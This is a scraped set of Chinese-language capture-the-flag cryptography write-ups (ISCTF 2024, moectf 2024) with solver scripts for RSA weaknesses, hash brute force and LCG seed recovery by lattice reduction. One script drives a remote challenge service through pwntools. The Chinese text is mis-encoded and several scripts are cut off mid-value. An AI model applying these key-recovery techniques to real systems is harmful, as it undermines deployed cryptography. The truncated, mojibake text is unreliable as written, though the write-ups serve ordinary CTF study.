flag1='ISCTF{'+str(uuid.uuid4())+'}' m1=bytes_to_long(flag1.encode()) def get_p(): BITS = 256 bits = 777 oder = 4 a = randint(1 \u003c\u003c bits, 1 \u003c\u003c bits + 1) p=getPrime(BITS) p1 = p**oder+a return p,p1 p,p1=get_p() s=getPrime(1024) q=getPrime(512) n=p*q**4 e=65537 c1=pow(s,e,n) c=pow(s**3+1,m1,s**5) print(\"c1=\",c1) print(\"c =\",c) print(\"n =\",n) print(\"p1 =\",p1) ''' c1= 671390498592586008552998377599101093977542184109077889081448730480869018650843045119891777468161631085086340705902115332025675787789530562679603254577287153918966364523848382506106179394235772395029788721306186952016420794804145631124905952103136061076643266886961178241381892015555099638200222249447194504082451341122502519637821695210573997670753981061458264118355417889153180841281073262935937836447460470926729282834006229571453935760593644658459098721652426154970766417292435960463905367868753821950303919781798234432998272038029063155193184039985018137026245365188171178677898869374676546799536208952198558258306460302868688355653022725288744014143221560882404431652751343944983442109327 c = 8641190030376811670503537177719719233418166235794962118828671236836174132083208517733734760455990850156371205118391537919769888760384574011411232571257192285256730733174399297826587479261381970232162702657952399683882650083181048279650913795429823628186888540572704055008102853692060360140858142686334722286525699998854566609078547487420929457446776757558492454916447188774943818970599916514467335772992690805247630814156710861067503956707301402347944233660194395192354000788262111000900574820275786269075882923600474781645848712157460135387134196156906258218217831988828360827613420801773911833194097791649069743116686685667300622630909231822986237104627385544169938138006242341269672868611269202418482629393372933567053272565557137741441902377611003983050084491513897727856173625922194300103448148829004025229567101761111396110940066254801762424343522707712480796358754008120503317686600144600226149617189681233392693738216138797012278242152852923361635415564580582002132107424154426980566696622448291815571736676562214017436 n = 1076246859437269645898003764327104347852443049519429833372038915264009774423737482018987571807662568251485615769880354898666799006772572239466617428164721157850526408878346223839884319846641438292436373441749602341461361190584638190903978829024853974880636148520803145113551453821058269641304504880310836801494499720662704717315748614372503735165114899680682056477494953525794354656896362929510309669119173103242509398650608116835276076364248473952717811633756784397347121601006659623317417388283638159905288128181587304367489096254611610975352096229116491567502061775862811850081040850421151385474249060884479729988512713640536139010928836126719149031115182144744359297169350288886555784650111 p1 = 145356063641618996012874664536921616978986640263438210169671010403677822239343590475177543891188656103067696467174379510912427160232486984044862545338401652910975162942038201716552753723984593267892098222213049269335313670049037479410635628460505327693176152061750827570561482918795206276991967169087371403553 ''' æ€è·¯ï¼šç¬¬ä¸€å¼€å§‹æ²¡æƒ³åˆ°å’Œæ–¹ç¨‹æœ‰ä»€ä¹ˆå…³ç³»ï¼Œç„¶åå‘ç°åœ¨æœ€åé¢ç”¨åˆ°äº†ï¼Œå‰é¢çš„pç›´æ¥å¼€æ–¹å¹¶ä¸”å¾ªç¯çˆ†ç ´ä¸€ä¸‹ï¼Œasssertä¸€ä¸‹ï¼Œä¿è¯æ— é”™ï¼Œç„¶åæ±‚qï¼Œä¹ŸassertéªŒè¯ä¸€ä¸‹ï¼Œç„¶åæ±‚å‡ºsï¼Œå‘ç°så¾ˆå¤§ï¼Œæ›´åˆ«è¯´s**5äº†ï¼Œä»¥ä¸‹æ˜¯æ€è·¯ åˆ©ç”¨ äºŒé¡¹å¼å®šç† å¯¹ (s^3 + 1)^m1 è¿›è¡Œå±•å¼€ï¼Œå¹¶ç®€åŒ–æ¨¡ s^5 çš„è¡¨è¾¾å¼ï¼š $$ (s^3 + 1)^{m1} \\equiv 1 + m1 \\cdot s^3 \\mod s^5 $$ å› æ­¤ï¼Œæ–¹ç¨‹å˜ä¸ºï¼š $$ 1 + m1 \\cdot s^3 \\equiv c \\mod s^5 $$ ç§»é¡¹åå¾—åˆ°ï¼š $$ m1 \\cdot s^3 \\equiv c - 1 \\mod s^5 $$ ç”±äº s^3 ä¸ s^5 çš„å…³ç³»ï¼Œå¯ä»¥å°† m1 è¡¨ç¤ºä¸ºï¼š $$ m1 \\equiv \\frac{c - 1}{s^3} \\mod s^2 $$ è¿™ä¸ªæ–¹ç¨‹è¡¨æ˜ï¼Œm1 å¯ä»¥é€šè¿‡ä»¥ä¸‹æ­¥éª¤ç›´æ¥è®¡ç®—ï¼š è®¡ç®— (c - 1) // s^3ï¼š ç¡®ä¿ (c - 1) èƒ½è¢« s^3 æ•´é™¤ï¼Œå¦åˆ™æ–¹ç¨‹æ— è§£ã€‚ å–æ¨¡ s^2ï¼šå› ä¸ºåœ¨æ¨¡ s^5 ä¸‹ï¼Œm1 çš„å€¼åœ¨æ¨¡ s^2 çš„èŒƒå›´å†…æ˜¯å”¯ä¸€ç¡®å®šçš„ã€‚ exp c1= 671390498592586008552998377599101093977542184109077889081448730480869018650843045119891777468161631085086340705902115332025675787789530562679603254577287153918966364523848382506106179394235772395029788721306186952016420794804145631124905952103136061076643266886961178241381892015555099638200","date":"2024-12-12","objectID":"/isctf2024_crypto/:2:8","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"HIMï¼ˆå¤ç°ï¼‰ task é™„ä»¶å¥½å¤§çš„ï¼Œç›´æ¥å»isä¸‹å§ï¼ˆå“­å“­ æ€è·¯ï¼šè¿™ç©æ„çš„åº”è¯¥æ˜¯https://github.com/spawnmason/randar-explanation è¿™ä¸ªä¸ºåŸºç¡€å‡ºæ¥çš„ï¼Œä»£ç å®¡è®¡ä¸€ä¸‹ï¼Œä¸»è¦çš„mainé‡Œè¾¹å°±æ˜¯HIMä¼šè®¾ç½®ä¸¤ä¸ªåœ¨-23440 åˆ°23440çš„éšæœºæ•°ï¼Œåˆ†åˆ«ä¸ºXï¼ŒZï¼Œæˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯æ¢å¤è¿™ä¸¤ä¸ªéšæœºæ•°ï¼Œæ¢å¤5æ¬¡å³å¯ã€‚å…¶å®æ²¡å•¥æ€è·¯ï¼Œçœ‹äº†çœ‹wpï¼Œå±…ç„¶æ˜¯LLLå‡ºæ¥çš„ï¼Œå¤§æ¦‚æ„æ€æ˜¯æˆ‘ä»¬é€šè¿‡åˆ°ä¸€äº›åœ°æ–¹ï¼Œç”Ÿæˆåæ ‡ï¼Œç„¶ååˆ©ç”¨åæ ‡å»LLLå‡ºseedï¼Œç„¶ååˆ©ç”¨LCGä¼ªéšæœºçš„ç‰¹æ€§æ±‚å‡ºhimçš„åæ ‡æ­£æ˜¯ç»™äº†himçš„èŒƒå›´ï¼Œæˆ‘ä»¬æ‰èƒ½çˆ†å‡ºæ¥ï¼ŒæŒºå¥½ç©çš„ï¼Œgithubçš„æ–‡æ¡£é‡Œé¢å°±æœ‰åšæ³•ï¼Œç›´æ¥ç”¨æ”¹æ”¹pwnåº“å°±è¡Œ exp from pwn import * sa = lambda s,n : p.sendafter(s,n) sla = lambda s,n : p.sendlineafter(s,n) sl = lambda s : p.sendline(s) sd = lambda s : p.send(s) rc = lambda n : p.recv(n) ru = lambda s : p.recvuntil(s) rl = lambda : p.recvline() it = lambda : p.interactive() ip = '' port = 0 p = remote(ip , port) # p = remote(\"127.0.0.1\", 8888) sla(\"è¯·è¾“å…¥ç”¨æˆ·å: \",b\"guoql\") sla(\"=\u003eè¯·é€‰æ‹©ï¼š\",b\"start\") for _ in range(5): sla(\"è¾“å…¥yesæŠ•å¸å¼€å§‹:\",b\"yes\") sla(\"è¯·é€‰æ‹©ï¼š\",\"2\") sla(\"è¯·è¾“å…¥æƒ³è¦æŒ–æ˜çš„æ–¹å—åæ ‡(ä¾‹ï¼š (1,1,1) )ï¼š\",b\"(1,1,1)\") data = rl().decode('utf-8') blockX,blockY,blockZ = tuple([float(\"0.\" + i.split(\".\")[1]) for i in data.split(\"Block drop in \")[1][:-1][1:-1].split(\", \")]) print(data,blockX,blockY,blockZ) randX = round(2 * 2**24 * (blockX - 0.25)) randY = round(2 * 2**24 * (blockY - 0.25)) randZ = round(2 * 2**24 * (blockZ - 0.25)) # è·å–ä½24ä½æ•°æ® print(f\"{randX},{randY},{randZ}\") # æ ¼åŸºè§„çº¦å¾—åˆ°åŸå§‹seed def crack(a0,b0,c0): a=25214903917 b=11 c=281474976710656 a1 = a0 * 2**24 + 2**23 b1 = b0 * 2**24 + 2**23 c1 = c0 * 2**24 + 2**23 v = vector([a1,b1 - b,c1 - b - a*b]) matex = matrix.zero(3) matex[0] = [1,a,a*a] matex[1] = [0,c,0] matex[2] = [0,0,c] lattice = matex.LLL() base = lattice.transpose().inverse() result = base*v final = vector([round(RDF(i)) for i in result]) solved = lattice.transpose() * final return solved seed = int(crack(randX, randY, randZ)[0]) # LCGçº¿æ€§åŒä½™æ±‚è§£å‡ºæ¥ä¸Šä¸€ä¸ªseed old_seed = ((seed - 11 ) * 246154705703781) % 2**48 # sagemathçš„å¼‚æˆ–æ˜¯^^è€Œä¸æ˜¯^ HIM_seed = old_seed ^^ 0x5DEECE66D print(old_seed,HIM_seed) world_seed = 14617218721232814696 # input() # å¯»æ‰¾xï¼Œzéœ€è¦æ»¡è¶³åœ¨-23440 åˆ° 23400 çš„èŒƒå›´å†… for x in range(-23440, 23441): z = ((HIM_seed - world_seed - 10387319 - x * 341873128712 ) * 211541297333629 ) % 2**48 if z \u003e= 2**48 + -23440 : z = z - 2**48 print(f\"x,z found:{x},{z}\") break if z \u003c= 23440: print(f\"x,z found:{x},{z}\") break sla(\"è¯·é€‰æ‹©ï¼š\", b\"1\") sla(\"è¯·è¾“å…¥HIMæ‰€åœ¨åŒºå—çš„åæ ‡(ä¾‹: (10,-25) )ï¼š\", f\"({x},{z})\".encode('utf-8')) print(rl().decode('utf-8')) print(rl().decode('utf-8')) ","date":"2024-12-12","objectID":"/isctf2024_crypto/:2:9","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"æ€»ç»“ æ€»çš„æ¥è¯´ä¸éš¾ï¼Œä½†æ˜¯é‚£ä¸ªå‹ç¼©åŒ…æˆ‘æ„Ÿè§‰æŒºæ²¡å¿…è¦çš„ï¼Œæœ€åè¿™ä¸ªhimæ„Ÿè§‰å¯ä»¥æ”¾ä¸ªhintï¼Œåªæœ‰Lä½¬åšå‡ºæ¥äº†ï¼Œå®³ï¼Œè¢«æŠ˜ç£¨äº†ä¸€å¤©ï¼Œå…¶ä»–çš„é¢˜éƒ½æŒºå¥½çš„ï¼Œæ²¡æœ‰å‡ºè€å¥—æ— èŠçš„é¢˜ï¼Œå¾ˆé€‚åˆæˆ‘ä»¬è¿™ç§åˆšå…¥é—¨çš„äººï¼Œå˜¿å˜¿ã€‚ ","date":"2024-12-12","objectID":"/isctf2024_crypto/:3:0","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"é¢˜ç›® ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:0","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"ç°ä»£å¯†ç å­¦æŒ‡åŒ— task: from Crypto.Util.number import bytes_to_long, getPrime from secret import flag p = getPrime(128) q = getPrime(128) n = p*q e = 65537 m = bytes_to_long(flag) c = pow(m, e, n) print(f\"n = {n}\") print(f\"p = {p}\") print(f\"q = {q}\") print(f\"c = {c}\") ''' n = 40600296529065757616876034307502386207424439675894291036278463517602256790833 p = 197380555956482914197022424175976066223 q = 205695522197318297682903544013139543071 c = 36450632910287169149899281952743051320560762944710752155402435752196566406306 ''' æ­£å¸¸è§£å¯†å³å¯ exp n = 40600296529065757616876034307502386207424439675894291036278463517602256790833 p = 197380555956482914197022424175976066223 q = 205695522197318297682903544013139543071 c = 36450632910287169149899281952743051320560762944710752155402435752196566406306 e=65537 from Crypto.Util.number import* phi = (p-1)*(q-1) d = inverse(e,phi) m = pow(c,d,n) print(long_to_bytes(m)) ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:1","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"baby_equation task from Crypto.Util.number import * from secret import flag l = len(flag) m1, m2 = flag[:l//2], flag[l//2:] a = bytes_to_long(m1) b = bytes_to_long(m2) k = 0x2227e398fc6ffcf5159863a345df85ba50d6845f8c06747769fee78f598e7cb1bcf875fb9e5a69ddd39da950f21cb49581c3487c29b7c61da0f584c32ea21ce1edda7f09a6e4c3ae3b4c8c12002bb2dfd0951037d3773a216e209900e51c7d78a0066aa9a387b068acbd4fb3168e915f306ba40 assert ((a**2 + 1)*(b**2 + 1) - 2*(a - b)*(a*b - 1)) == 4*(k + a*b) æ€è·¯ å…¶å®å°±æ˜¯å› å¼åˆ†è§£ä¼šå¾—åˆ°$(ab-1-a-b)^2=4k$,é‚£ä¹ˆå…ˆå¼€æ ¹å·ï¼Œå†å› å¼åˆ†è§£ï¼Œå†å¯¹å› å­è¿›è¡Œæ’åˆ—ç»„åˆå°±å¥½ exp from gmpy2 import * from Crypto.Util.number import * from math import * k = 0x2227e398fc6ffcf5159863a345df85ba50d6845f8c06747769fee78f598e7cb1bcf875fb9e5a69ddd39da950f21cb49581c3487c29b7c61da0f584c32ea21ce1edda7f09a6e4c3ae3b4c8c12002bb2dfd0951037d3773a216e209900e51c7d78a0066aa9a387b068acbd4fb3168e915f306ba40 x = iroot(4*k,2) print(x) # factor(x) factors = [2,2,2,2,3,3,31,61,223,4013,281317,4151351,5404604441993, 26798471753993,25866088332911027256931479223,64889106213996537255229963986303510188999911,370523737,339386329] T = prod(factors) t = T ** 0.5 n = len(factors) dp = {1: []} for i in factors: for j in list(dp.keys()): cnt = j * i if cnt not in dp: dp[cnt] = dp[j] + [i] min = min(dp.keys(), key=lambda x: abs(x - t)) factor1 = min factor2 = T // min print(factor1) print(factor2) print(long_to_bytes(2948658764987911698882278955266869405625105496652193856947916257370492+1)) print(long_to_bytes(2950365559902224963252311699604518749050102395042841254385700637274676-1)) ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:2","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"big and small task from secret import flag from Crypto.Util.number import* m = long_to_bytes(flag) p = getPrime(1024) q = getPrime(1024) n = p*q e = 3 c = pow(m,e,n) ''' c = 150409620528288093947185249913242033500530715593845912018225648212915478065982806112747164334970339684262757 e = 3 n = 20279309983698966932589436610174513524888616098014944133902125993694471293062261713076591251054086174169670848598415548609375570643330808663804049384020949389856831520202461767497906977295453545771698220639545101966866003886108320987081153619862170206953817850993602202650467676163476075276351519648193219850062278314841385459627485588891326899019745457679891867632849975694274064320723175687748633644074614068978098629566677125696150343248924059801632081514235975357906763251498042129457546586971828204136347260818828746304688911632041538714834683709493303900837361850396599138626509382069186433843547745480160634787 ''' æ€è·¯ å°æ˜æ–‡æ”»å‡» exp c = 150409620528288093947185249913242033500530715593845912018225648212915478065982806112747164334970339684262757 e = 3 n = 20279309983698966932589436610174513524888616098014944133902125993694471293062261713076591251054086174169670848598415548609375570643330808663804049384020949389856831520202461767497906977295453545771698220639545101966866003886108320987081153619862170206953817850993602202650467676163476075276351519648193219850062278314841385459627485588891326899019745457679891867632849975694274064320723175687748633644074614068978098629566677125696150343248924059801632081514235975357906763251498042129457546586971828204136347260818828746304688911632041538714834683709493303900837361850396599138626509382069186433843547745480160634787 from Crypto.Util.number import* from gmpy2 import* flag=iroot(c,e)[0] print(long_to_bytes(flag)) ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:3","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"ez_hash task from hashlib import sha256 from secret import flag, secrets assert flag == b'moectf{' + secrets + b'}' assert secrets[:4] == b'2100' and len(secrets) == 10 hash_value = sha256(secrets).hexdigest() print(f\"{hash_value = }\") # hash_value = '3a5137149f705e4da1bf6742e62c018e3f7a1784ceebcb0030656a2b42f50b6a' æ€è·¯ï¼š å·²çŸ¥å‰å››ä½ï¼Œåå…­ä½æœªçŸ¥ï¼ŒçŒœæµ‹éƒ½æ˜¯æ•°å­—ï¼Œç›´æ¥çˆ†ç ´ exp import hashlib target_hash = '3a5137149f705e4da1bf6742e62c018e3f7a1784ceebcb0030656a2b42f50b6a' for i in range(100000000): secrets_candidate = f'2100{i:06}'.encode() # ç”Ÿæˆ '2100XXXXXX' æ ¼å¼çš„å­—èŠ‚ä¸² if hashlib.sha256(secrets_candidate).hexdigest() == target_hash: flag = b'moectf{' + secrets_candidate + b'}' print(flag) break ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:4","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"signin task from Crypto.Util.number import* from secret import flag m = bytes_to_long(flag) p = getPrime(1024) q = getPrime(1024) n = p*q e = 65537 c = pow(m,e,n) pq = (p-1)*(q-2) qp = (q-1)*(p-2) p_q = p + q print(f\"{c = }\") print(f\"{pq = }\") print(f\"{qp = }\") print(f\"{n = }\") print(f\"{p_q = }\") ''' c = 5654386228732582062836480859915557858019553457231956237167652323191768422394980061906028416785155458721240012614551996577092521454960121688179565370052222983096211611352630963027300416387011219744891121506834201808533675072141450111382372702075488292867077512403293072053681315714857246273046785264966933854754543533442866929316042885151966997466549713023923528666038905359773392516627983694351534177829247262148749867874156066768643169675380054673701641774814655290118723774060082161615682005335103074445205806731112430609256580951996554318845128022415956933291151825345962528562570998777860222407032989708801549746 pq = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687154230787854196153067547938936776488741864214499155892870610823979739278296501074632962069426593691194105670021035337609896886690049677222778251559566664735419100459953672218523709852732976706321086266274840999100037702428847290063111455101343033924136386513077951516363739936487970952511422443500922412450462 qp = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687077087914198877794354459669808240133383828356379423767736753506794441545506312066344576298453957064590180141648690226266236642320508613544047037110363523129966437840660693885863331837516125853621802358973786440314619135781324447765480391038912783714312479080029167695447650048419230865326299964671353746764860 n = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687534959910892789661065614807265825078942931717855566686073463382398417205648946713373617006449901977718981043020664616841303517708207413215548110294271101267236070252015782044263961319221848136717220979435486850254298686692230935985442120369913666939804135884857831857184001072678312992442792825575636200505903 p_q = 279533706577501791569740668595544511920056954944184570513187478007551195831693428589898548339751066551225424790534556602157835468618845221423643972870671556362200734472399328046960316064864571163851111207448753697980178391430044714097464866523838747053135392202848167518870720149808055682621080992998747265496 ''' æ€è·¯ è§£æ–¹ç¨‹ exp from sympy import symbols, Eq, solve p, q = symbols('p q') c = 5654386228732582062836480859915557858019553457231956237167652323191768422394980061906028416785155458721240012614551996577092521454960121688179565370052222983096211611352630963027300416387011219744891121506834201808533675072141450111382372702075488292867077512403293072053681315714857246273046785264966933854754543533442866929316042885151966997466549713023923528666038905359773392516627983694351534177829247262148749867874156066768643169675380054673701641774814655290118723774060082161615682005335103074445205806731112430609256580951996554318845128022415956933291151825345962528562570998777860222407032989708801549746 pq = 1804701753928911427519501938409002653042575823662534712139490387998091461866963390266810035378891047014197664033767570057057312702069308117596198857162175971112206245219252692474476056178862570","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:5","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"å¤§ç™½å…” task from Crypto.Util.number import * flag = b'moectf{xxxxxxxxxx}' m = bytes_to_long(flag) e1 = 12886657667389660800780796462970504910193928992888518978200029826975978624718627799215564700096007849924866627154987365059524315097631111242449314835868137 e2 = 12110586673991788415780355139635579057920926864887110308343229256046868242179445444897790171351302575188607117081580121488253540215781625598048021161675697 def encrypt(m , e1 , e2): p = getPrime(512) q = getPrime(512) N = p*q c1 = pow((3*p + 7*q),e1,N) c2 = pow((2*p + 5*q),e2,N) e = 65537 c = pow(m , e , N) return c print(encrypt(m ,e1 , e2)) ''' N = 107840121617107284699019090755767399009554361670188656102287857367092313896799727185137951450003247965287300048132826912467422962758914809476564079425779097585271563973653308788065070590668934509937791637166407147571226702362485442679293305752947015356987589781998813882776841558543311396327103000285832158267 c1 = 15278844009298149463236710060119404122281203585460351155794211733716186259289419248721909282013233358914974167205731639272302971369075321450669419689268407608888816060862821686659088366316321953682936422067632021137937376646898475874811704685412676289281874194427175778134400538795937306359483779509843470045 c2 = 21094604591001258468822028459854756976693597859353651781642590543104398882448014423389799438692388258400734914492082531343013931478752601777032815369293749155925484130072691903725072096643826915317436719353858305966176758359761523170683475946913692317028587403027415142211886317152812178943344234591487108474 c = 21770231043448943684137443679409353766384859347908158264676803189707943062309013723698099073818477179441395009450511276043831958306355425252049047563947202180509717848175083113955255931885159933086221453965914552773593606054520151827862155643433544585058451821992566091775233163599161774796561236063625305050 ''' æ€è·¯ å¾ˆç»å…¸çš„é¢˜ç›® $$ c1^e=(3p+7q)^{e1e2}=(3p)^{e1e2}+(7q)^{e1e2} mod N \\\\ c2^e=(2p+5q)^{e1e2}=(2p)^{e1e2}+(5q)^{e1e2} mod N \\\\ s=2^{e1e2}*c1^e-3^{e1e2}*c2^e=k*q^{e1e2} \\\\ GCD(s,N)=q $$æ±‚å‡ºqä¹‹åpä¹Ÿå°±å‡ºæ¥äº† exp from gmpy2 import* from Crypto.Util.number import * N = 107840121617107284699019090755767399009554361670188656102287857367092313896799727185137951450003247965287300048132826912467422962758914809476564079425779097585271563973653308788065070590668934509937791637166407147571226702362485442679293305752947015356987589781998813882776841558543311396327103000285832158267 c1 = 15278844009298149463236710060119404122281203585460351155794211733716186259289419248721909282013233358914974167205731639272302971369075321450669419689268407608888816060862821686659088366316321953682936422067632021137937376646898475874811704685412676289281874194427175778134400538795937306359483779509843470045 c2 = 21094604591001258468822028459854756976693597859353651781642590543104398882448014423389799438692388258400734914492082531343013931478752601777032815369293749155925484130072691903725072096643826915317436719353858305966176758359761523170683475946913692317028587403027415142211886317152812178943344234591487108474 c = 21770231043448943684137443679409353766384859347908158264676803189707943062309013723698099073818477179441395009450511276043831958306355425252049047563947202180509717848175083113955255931885159933086221453965914552773593606054520151827862155643433544585058451821992566091775233163599161774796561236063625305050 e1 = 12886657667389660800780796462970504910193928992888518978200029826975978624718627799215564700096007849924866627154987365059524315097631111242449314835868137 e2 = 12110586673991788415780355139635579057920926864887110308343229256046868242179445444897790171351302575188607117081580121488253540215781625598048021161675697 f1 = pow(2, e1*e2, N) * pow(c1, e2, N) f2 = pow(3, e1*e2, N) * pow(c2, e1, N) q = abs(gcd(N, f1-f2)) p = N//q print(p) print(q) phi= (p-1)*(q-1) e= 65537 d= inverse(e, phi) m= pow(c, d, N) print(long_to_bytes(m)) ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:6","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"More_secure_RSA task from Crypto.Util.number import * flag = b'moectf{xxxxxxxxxxxxxxxxx}' m = bytes_to_long(flag) p = getPrime(1024) q = getPrime(1024) n = p * q e = 0x10001 c = pow(m, e, n) print(f'c = {c}') print(f'n = {n}') ''' Oh,it isn't secure enough! ''' r = getPrime(1024) n = n * r c = pow(m, e, n) print(f'C = {c}') print(f'N = {n}') ''' c = 12992001402636687796268040906463852467529970619872166160007439409443075922491126428847990768804065656732371491774347799153093983118784555645908829567829548859716413703103209412482479508343241998746249393768508777622820076455330613128741381912099938105655018512573026861940845244466234378454245880629342180767100764598827416092526417994583641312226881576127632370028945947135323079587274787414572359073029332698851987672702157745794918609888672070493920551556186777642058518490585668611348975669471428437362746100320309846155934102756433753034162932191229328675448044938003423750406476228868496511462133634606503693079 n = 16760451201391024696418913179234861888113832949815649025201341186309388740780898642590379902259593220641452627925947802309781199156988046583854929589247527084026680464342103254634748964055033978328252761138909542146887482496813497896976832003216423447393810177016885992747522928136591835072195940398326424124029565251687167288485208146954678847038593953469848332815562187712001459140478020493313651426887636649268670397448218362549694265319848881027371779537447178555467759075683890711378208297971106626715743420508210599451447691532788685271412002723151323393995544873109062325826624960729007816102008198301645376867 C = 1227033973455439811038965425016278272592822512256148222404772464092642222302372689559402052996223110030680007093325025949747279355588869610656002059632685923872583886766517117583919384724629204452792737574445503481745695471566288752636639781636328540996436873887919128841538555313423836184797745537334236330889208413647074397092468650216303253820651869085588312638684722811238160039030594617522353067149762052873350299600889103069287265886917090425220904041840138118263873905802974197870859876987498993203027783705816687972808545961406313020500064095748870911561417904189058228917692021384088878397661756664374001122513267695267328164638124063984860445614300596622724681078873949436838102653185753255893379061574117715898417467680511056057317389854185497208849779847977169612242457941087161796645858881075586042016211743804958051233958262543770583176092221108309442538853893897999632683991081144231262128099816782478630830512 N = 1582486998399823540384313363363200260039711250093373548450892400684356890467422451159815746483347199068277830442685312502502514973605405506156013209395631708510855837597653498237290013890476973370263029834010665311042146273467094659451409034794827522542915103958741659248650774670557720668659089460310790788084368196624348469099001192897822358856214600885522908210687134137858300443670196386746010492684253036113022895437366747816728740885167967611021884779088402351311559013670949736441410139393856449468509407623330301946032314939458008738468741010360957434872591481558393042769373898724673597908686260890901656655294366875485821714239821243979564573095617073080807533166477233759321906588148907331569823186970816432053078415316559827307902239918504432915818595223579467402557885923581022810437311450172587275470923899187494633883841322542969792396699601487817033616266657366148353065324836976610554682254923012474470450197 ''' æ€è·¯ ç”¨rä½œä¸ºæ¨¡æ•°è¿›è¡Œæ±‚è§£ exp from sympy import mod_inverse from Crypto.Util.number import long_to_bytes c = 129920014026366877962680409064638524675299706198721661600074394094430759224911264288479907688040656567323714917743477991530939831187845556459088295678295488597164137031032094124824795083432419987462493937685087776228200764553306131287413819120999381056550185125730268619408452444662343784542458806293421807671007645988274160925264179945836413122268815761276323700289459471353230795872747874145723590730293326988519876727021577457949186098886720704","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:7","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"ezlegendre task from sympy import * from Crypto.Util.number import * p = getPrime(128) e = randprime(2, p) FLAG = b'm' def encrypt_flag(flag): ciphertext = [] plaintext = ''.join([bin(i)[2:].zfill(8) for i in flag]) print(plaintext) for bit in plaintext: n = pow(int(bit) + e, e , p) ciphertext.append(n) return ciphertext print(f\"p = {p}\") print(encrypt_flag(FLAG)) æ€è·¯ åªæœ‰ä¸¤ä¸ªæ•°å­—ï¼ŒæŠŠ83185897643827119919760550833655486588å½“ä½œ0ï¼Œ171219394072263643527316538070481587611å½“ä½œ1ï¼Œå°±æ˜¯01å­—ç¬¦ä¸²ï¼Œç„¶åè½¬å­—ç¬¦å°±å¥½äº†,æ•°æ®å¤ªå¤§ï¼Œå°±ä¸å†™äº† exp conversion_dict = { 83185897643827119919760550833655486588: 0, 171219394072263643527316538070481587611: 1 } converted_c = [conversion_dict.get(x, x) for x in c] converted_c_str = ''.join(map(str, converted_c)) print(converted_c_str) s=b'01101101011011110110010101100011011101000110011001111011011011010110100101101110011101010111001101011111011011110110111001100101010111110011000101110011010111110110111000110000011101000101111101110001011101010011010001100100011100100011010001110100011010010110001101011111011100100011010001110011011010010110010001110101001101000101111101110111011010000110010101101110010111110111000001011111011011010110111101100100010111110110011000110000011101010111001001011111011001010111000101110101001101000011000101011111011101000110111101011111011101000110100001110010001100110011001101111101' binary_string = b'01101101011011110110010101100011011101000110011001111011011011010110100101101110011101010111001101011111011011110110111001100101010111110011000101110011010111110110111000110000011101000101111101110001011101010011010001100100011100100011010001110100011010010110001101011111011100100011010001110011011010010110010001110101001101000101111101110111011010000110010101101110010111110111000001011111011011010110111101100100010111110110011000110000011101010111001001011111011001010111000101110101001101000011000101011111011101000110111101011111011101000110100001110010001100110011001101111101' text = ''.join(chr(int(binary_string[i:i+8], 2)) for i in range(0, len(binary_string), 8)) print(text) ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:8","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"new_system task from random import randint from Crypto.Util.number import getPrime,bytes_to_long flag = b'moectf{???????????????}' gift = bytes_to_long(flag) def parametergenerate(): q = getPrime(256) gift1 = randint(1, q) gift2 = (gift - gift1) % q x = randint(1, q) assert gift == (gift1 + gift2) % q return q , x , gift1, gift2 def encrypt(m , q , x): a = randint(1, q) c = (a*x + m) % q return [a , c] q , x , gift1 , gift2 = parametergenerate() print(encrypt(gift1 , q , x)) print(encrypt(gift2 , q , x)) print(encrypt(gift , q , x)) print(f'q = {q}') ''' [48152794364522745851371693618734308982941622286593286738834529420565211572487, 21052760152946883017126800753094180159601684210961525956716021776156447417961] [48649737427609115586886970515713274413023152700099032993736004585718157300141, 6060718815088072976566240336428486321776540407635735983986746493811330309844] [30099883325957937700435284907440664781247503171217717818782838808179889651361, 85333708281128255260940125642017184300901184334842582132090488518099650581761] q = 105482865285555225519947662900872028851795846950902311343782163147659668129411 ''' æ€è·¯ $$ c_i = a_i*x+g \\mod q \\\\ C = (a_1+a_2)*x+g \\mod q \\\\ d = (a_1+a_2-a_3)*x \\mod q $$å¸¦å…¥æ±‚è§£å°±è¡Œäº† exp from Crypto.Util.number import inverse, long_to_bytes a1, c1 = 48152794364522745851371693618734308982941622286593286738834529420565211572487, 21052760152946883017126800753094180159601684210961525956716021776156447417961 a2, c2 = 48649737427609115586886970515713274413023152700099032993736004585718157300141, 6060718815088072976566240336428486321776540407635735983986746493811330309844 a3, c3 = 